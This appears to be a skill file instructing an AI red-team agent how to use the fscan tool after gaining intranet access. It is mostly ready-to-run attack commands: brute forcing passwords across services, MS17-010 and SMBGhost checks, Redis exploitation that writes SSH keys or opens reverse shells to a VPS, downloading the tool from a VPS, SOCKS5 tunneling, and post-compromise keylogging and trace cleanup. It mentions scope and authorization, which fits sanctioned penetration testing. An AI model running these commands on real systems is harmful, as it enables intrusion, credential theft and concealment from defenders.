---
name: fscan-intranet
description: fscan v2.2.1 intranet comprehensive scanning: host discovery, port/service identification, weak-password brute force across 28 service types, unauthorized access and high-risk vulnerabilities (MS17-010/SMBGhost), Redis exploitation, and SOCKS5 tunneling
whenToUse: After entering the intranet (jump host/webshell/SOCKS5 tunnel) to quickly map assets, find weak passwords and unauthorized access, and turn reachability into attack points
role: internal
enabled: true
---

# fscan (intranet comprehensive scanning, weak passwords, and vulnerabilities)

`fscan` = **breadth-first intranet sweep**: feed it a CIDR block and get live hosts, open ports, service fingerprints, web titles,
weak passwords, unauthorized access, and high-risk vulnerabilities within minutes. **Noisy**, suitable only for intranet (use external scanning skills for internet targets).

## Division of labor with gogo

| | fscan | gogo |
| --- | --- | --- |
| Focus | Comprehensive sweep + brute force + exploitation | High-performance mapping + fingerprinting + information extraction |
| Noise | High (default 600 threads + brute force + POC) | Controllable (`--opsec`, tunable threads/timeout) |
| Which to use first | Known targets, need weak passwords and vulns quickly | Large segments to map surface, need fingerprints and titles |

**Recommended order**: use `gogo` first to map and get asset inventory → then use `fscan` for targeted brute force and vulnerability checks on confirmed live targets.

## Binaries

```
Local : $DSH_HOME/redteam/toolkit/fscan/fscan          (v2.2.1, with local plugins)
        $DSH_HOME/redteam/toolkit/fscan/fscan_windows_x64.exe
        $DSH_HOME/redteam/toolkit/fscan/fscan_linux_arm64
VPS   : http://<your-vps-ip>:9100/fscan                (payload directory from skill vps-reverse-shell)
```

The install script downloads only linux/amd64 `fscan`. Windows and ARM files must be added manually; use the main file above on the current platform.

**Transfer to jump host/target** (intranet scanning must run from a location that can reach the intranet):

```bash
# Download directly on jump host (start payload service on VPS: ~/.dsh/redteam/toolkit/vps/vps.sh serve 9100)
curl -o fscan http://<your-vps-ip>:9100/fscan && chmod +x fscan
# Or upload from local machine via shells
```

## Discipline (read first)

1. **Scope**: use only network segments in the authorized list; explicitly exclude office networks, printers, ICS, and cloud metadata (169.254.169.254) with `-eh/-ehf`.
2. **Do not crash devices**: default `-t 600` is dangerous for old devices/ICS. Start with `-t 100 -time 3` in intranet and increase only after confirming devices can handle it.
3. **No brute force/POC first**: first round `-nobr -nopoc` for asset surface only; after confirming target importance and authorization, enable in a second round.
4. **Avoid honeypots/IDS**: use `-rate` for throttling and `-maxpkts` for limits; admins may be watching.
5. **DNSLog exfiltration**: `-dns -domain <your-dnslog-domain>`; do not use public DNSLog for sensitive data.

## Standard operating procedure (SOP)

```bash
# 0) Confirm where you are and what you can reach
ip a; ip route

# 1) Liveness sweep (fastest, identify live hosts first)
./fscan -h 10.0.0.0/24 -m icmp -o alive.txt -nocolor

# 2) Asset surface (no brute force, no POC, quietest)
./fscan -h 10.0.0.0/24 -np -nobr -nopoc -t 100 -time 3 -o assets.txt

# 3) Web first: hand web ports from assets.txt to screenshot/fingerprint stage
./fscan -h 10.0.0.0/24 -p 80,443,8080,8000,8888,9000,7001,9090 -nobr -nopoc -nocolor

# 4) Targeted brute force (after authorization confirmed)
./fscan -h 10.0.0.5 -m ssh -user root -pwdf /tmp/pass.txt -t 5

# 5) High-risk vulnerabilities and unauthorized access
./fscan -h 10.0.0.0/24 -m ms17010,smbghost -nobr
./fscan -h 10.0.0.0/24 -p 6379,27017,9200,11211,2181 -nobr -nopoc
```

## Parameter quick reference (tested v2.2.1 `-help`)

**Targets**
```
-h  <IP|CIDR|file|domain>   target (IP range files supported)
-hf <file>                  host file        -eh/-ehf  exclude hosts/exclude file
-u  <URL>  -uf <file>       single URL / URL file     -domain <domain>
```

**Ports and liveness**
```
-p  21,22,80,443,3306,6379,10000-10100    ports (default ~150 common ports)
-pf <file>  port file        -ep exclude ports
-np         disable ping probe (scan ports only, faster)      -ao  liveness probe only
-nsp        disable subnet prefilter (speed up large segments) -ntp disable TCP supplemental probe
```

**Modes**
```
-m all        default full flow (includes brute force + POC)
-m icmp       liveness only
-m <plugin>   run specific service plugin, e.g. -m ssh / -m redis / -m smb2 / -m ms17010 / -m netbios
-nobr         disable brute force   -nopoc disable POC   -noredis disable Redis exploitation
```

**Concurrency and throttling** (key for OPSEC)
```
-t 600       port scan threads        -time 3   port timeout (sec)
-mt 20       module threads           -wt 5     web timeout
-gt 0        global timeout (sec)     -retry 3  retries
-rate 0      max packets per minute (0=unlimited)   -maxpkts 0  total packet limit
-num 20      POC concurrency          -icmp-rate 0.1  ICMP rate
```

**Credentials (brute force)**
```
-user/-pwd      single username/password      -userf/-pwdf  dictionary files
-upf            username:password pair file   -usera/-pwda  append multiple (comma/space separated)
-hash/-hashf    NTLM hash spraying            -sshkey       private key login
```

**Exploitation (use when obtained, respect authorization boundaries)**
```
-rf <pubkey>        Redis write public key (write authorized_keys for SSH)
-rs                 Redis shell        -rwc/-rwf/-rwp  Redis write content/file/path
-rsh <ip:port>      reverse shell to specified address (use with skill vps-reverse-shell)
-sc <shellcode>     MS17-010 shellcode
-local <plugin>     local plugins: systeminfo / keylogger / cleaner etc. (run on jump host)
-start-socks5 1080  start SOCKS5 service on jump host to expose intranet locally
-fsh-port 4444      forward shell server port
```

**Proxy (core usage after tunneling)**
```
-socks5 127.0.0.1:1080                 via SOCKS5 (suo5 / ssh -D / frp all work)
-socks5 socks5://user:pass@127.0.0.1:1080
-proxy http://127.0.0.1:8080           via HTTP proxy
```

**Output**
```
-o result.txt    output file        -f txt|json|csv   format
-no              do not save        -silent  silent   -nocolor/-nopg  disable color/progress bar
-lang zh|en      language           -log "base,info,success"   log levels
-dns             record DNS log (use with -domain for exfiltration detection)
-perf            output performance stats JSON
```

## Key scenarios

### 1. Scan intranet through tunnel (most common)

```bash
# Prerequisite: SOCKS5 available (skill suo5-tunnel, or ssh -D in vps-reverse-shell)
# Verified: fscan -socks5 truly sends traffic through the tunnel
./fscan -h 10.0.0.0/24 -p 22,80,445,3306,6379 -np -nobr -nopoc \
        -socks5 127.0.0.1:1080 -t 50 -time 5 -o intranet.txt
```

Note: do not set threads too high through proxy (tunnel is the bottleneck); `-t 50` is usually enough.

### 2. Start tunnel on jump host for local use

Run on jump host (expose intranet 10.x to VPS port 9100, then reverse-tunnel back via ssh):

```bash
./fscan -start-socks5 1080      # jump host:1080 becomes SOCKS5
# reverse tunnel on VPS: ssh -R 9200:127.0.0.1:1080 ubuntu@<your-vps-ip>
# local: ssh -L 1080:127.0.0.1:9200 ubuntu@<your-vps-ip>
# then all tools can use -socks5 127.0.0.1:1080
```

### 3. Exploit Redis for access directly

```bash
./fscan -h 10.0.0.5 -p 6379 -m redis -rf ~/.ssh/id_rsa.pub     # write public key → ssh in
./fscan -h 10.0.0.5 -p 6379 -rs                                  # Redis shell
./fscan -h 10.0.0.5 -p 6379 -rsh <your-vps-ip>:9000              # reverse shell to VPS listener
```

### 4. After landing on a server

```bash
./fscan -local systeminfo        # system info, env vars, DC, NICs
./fscan -local keylogger         # keylogger (-keylog-output specifies output)
./fscan -local cleaner           # trace cleanup
```

## Record results to database (required)

fscan txt output is sectioned; parse and store each item:

```bash
# Each live host
redteam_asset_add  { engagement, ip, source: "fscan", tags: ["internal"] }
# Each open port/service
redteam_asset_add  { engagement, ip, port, service, banner }   # or link via asset_link
# Credentials and access from successful brute force/unauthorized access
redteam_credential_add { engagement, host, username, secret_type, secret_ref: "runs/fscan-<segment>.txt" }
redteam_access_add     { engagement, host, username, method: "ssh", privilege, session_ref }
# Confirmed vulnerabilities (must include http_evidence or equivalent)
redteam_vuln_add   { engagement, target, name: "Redis unauthorized access", severity: "high", evidence_ref }
```

**Discipline**: output files from `-o` are evidence; copy them back to `runs/`; do not count a quick terminal glance as recorded.

## Troubleshooting

| Symptom | Action |
| --- | --- |
| Very slow / stuck | Remove `-np`, lower `-t`, increase `-time`; for large segments first use `-m icmp` to find live hosts |
| Many false opens | Firewall/load balancer returning SYN-ACK; increase `-time` and verify with `-retry` |
| ICMP fails | Requires root/`CAP_NET_RAW`; use `sudo ./fscan -m icmp`, or switch to `-np` (ports only) |
| Brute force causes lockout | Try small sets with `-usera` first; confirm no lockout policy (especially dangerous for domain accounts) |
| Garbled non-ASCII text | `-lang en` |
| Need quieter scan | `-nobr -nopoc -nocolor -nopg -t 50 -rate 6000`, add `-silent` if needed |

## Related skills

- `gogo-intranet`: use it first for mapping
- `suo5-tunnel`: webshell → SOCKS5, provides `-socks5` entry for fscan
- `vps-reverse-shell`: landing point for `-rsh` and payload delivery
- `webshell-toolkit`: management after obtaining a webshell
